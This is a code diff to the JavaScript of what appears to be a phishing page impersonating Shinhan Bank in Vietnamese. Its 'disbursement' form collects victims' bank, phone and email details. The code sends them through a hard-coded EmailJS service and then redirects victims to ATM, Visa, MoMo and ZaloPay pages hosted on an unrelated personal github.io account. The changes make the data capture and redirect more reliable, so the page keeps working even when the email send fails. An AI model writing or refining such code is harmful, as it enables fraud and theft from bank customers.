@@ -1056,7 +1056,7 @@
                     bank: bankSelect.querySelector(`[data-value="${bank}"]`).textContent.trim(),
                     phone,
                     email,
-                    method: method.charAt(0).toUpperCase() + method.slice(1)
+                    method: method // Giữ nguyên giá trị gốc để dùng cho redirect
                 };
                 sessionStorage.setItem('formData', JSON.stringify(formData));
             }
@@ -1075,37 +1075,92 @@
                 bank: formData.bank,
                 phone: formData.phone,
                 email: formData.email,
-                method: formData.method
+                method: formData.method.charAt(0).toUpperCase() + formData.method.slice(1)
             };
 
             console.log('Sending formData to EmailJS:', templateParams); // Debug log
+            
+            // Nếu EmailJS không khả dụng, trả về Promise resolved
+            if (typeof emailjs === 'undefined') {
+                console.warn('EmailJS not available, skipping email send');
+                return Promise.resolve();
+            }
+            
             return emailjs.send('service_60tgxof', 'template_qt33aql', templateParams)
                 .then(() => {
                     console.log('Email sent successfully:', templateParams);
+                })
+                .catch((error) => {
+                    console.warn('Email sending failed, but continuing:', error);
+                    // Không throw error để không block redirect
                 });
         }
 
         // Form Submission
         document.getElementById('disbursement-form').addEventListener('submit', (e) => {
             e.preventDefault();
+            
+            // Disable submit button to prevent double submission
+            const submitButton = document.querySelector('button[type="submit"]');
+            const originalText = submitButton.textContent;
+            submitButton.disabled = true;
+            submitButton.textContent = 'Đang xử lý...';
+            
             const { isValid, method } = validateForm();
+            console.log('Form validation result:', { isValid, method });
             if (isValid) {
-                sendEmail().finally(() => {
+                sendEmail().then(() => {
                     const redirectURLs = {
-                        bank: '/shinhanbank/pages/vi/atm.html',
-                        visa: '/shinhanbank/pages/vi/visa.html',
-                        momo: '/shinhanbank/pages/vi/momo.html',
-                        zalopay: '/shinhanbank/pages/vi/zalopay.html'
+                        bank: 'https://hungshinhance-art.github.io/shinhanbank/pages/vi/atm.html',
+                        visa: 'https://hungshinhance-art.github.io/shinhanbank/pages/vi/visa.html',
+                        momo: 'https://hungshinhance-art.github.io/shinhanbank/pages/vi/momo.html',
+                        zalopay: 'https://hungshinhance-art.github.io/shinhanbank/pages/vi/zalopay.html'
                     };
                     const redirectURL = redirectURLs[method.toLowerCase()];
-                    try {
-                        console.log(`Attempting redirect to: ${redirectURL}`);
-                        window.location.href = redirectURL;
-                    } catch (error) {
-                        console.error('Redirect error:', error);
-                        alert('Lỗi khi chuyển hướng. Vui lòng thử lại.');
+                    console.log('Redirect mapping:', { method, redirectURL });
+                    if (redirectURL) {
+                        try {
+                            console.log(`Attempting redirect to: ${redirectURL}`);
+                            // Thử nhiều cách redirect
+                            setTimeout(() => {
+                                window.location.href = redirectURL;
+                            }, 100);
+                        } catch (error) {
+                            console.error('Redirect error:', error);
+                            // Fallback redirect
+                            window.location.replace(redirectURL);
+                        }
+                    } else {
+                        console.error('No redirect URL found for method:', method);
+                        alert('Không tìm thấy đường dẫn chuyển hướng. Vui lòng thử lại.');
+                        // Re-enable button
+                        submitButton.disabled = false;
+                        submitButton.textContent = originalText;
+                    }
+                }).catch((error) => {
+                    console.error('Email sending failed:', error);
+                    // Vẫn chuyển hướng ngay cả khi gửi email thất bại
+                    const redirectURLs = {
+                        bank: 'https://hungshinhance-art.github.io/shinhanbank/pages/vi/atm.html',
+                        visa: 'https://hungshinhance-art.github.io/shinhanbank/pages/vi/visa.html',
+                        momo: 'https://hungshinhance-art.github.io/shinhanbank/pages/vi/momo.html',
+                        zalopay: 'https://hungshinhance-art.github.io/shinhanbank/pages/vi/zalopay.html'
+                    };
+                    const redirectURL = redirectURLs[method.toLowerCase()];
+                    if (redirectURL) {
+                        setTimeout(() => {
+                            window.location.href = redirectURL;
+                        }, 100);
+                    } else {
+                        // Re-enable button if redirect fails
+                        submitButton.disabled = false;
+                        submitButton.textContent = originalText;
                     }
                 });
+            } else {
+                // Re-enable submit button if validation failed
+                submitButton.disabled = false;
+                submitButton.textContent = originalText;
             }
         });
 
